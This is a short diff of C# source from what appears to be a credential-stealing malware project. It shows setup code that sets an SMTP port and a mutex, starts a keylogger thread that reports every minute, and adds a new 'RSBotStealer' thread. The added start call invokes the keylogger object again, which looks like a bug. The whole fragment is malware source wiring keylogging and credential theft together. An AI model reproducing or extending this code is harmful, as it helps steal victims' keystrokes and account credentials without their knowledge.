@@ -36,8 +36,12 @@ namespace sub
             Settings.SmtpPort = 587;
 
             Variables.Mutex = new Mutex(false, Variables.MutexID, out Variables.CreatedMutex);
+
             StealerThread logger = new StealerThread(new Keylogger());    
             logger.Start(1); //Starts a Keylogger that reports every 1 minute
+
+            StealerThread rsbot = new StealerThread(new RSBotStealer());
+            logger.Start(-1);
         }
     }
 }
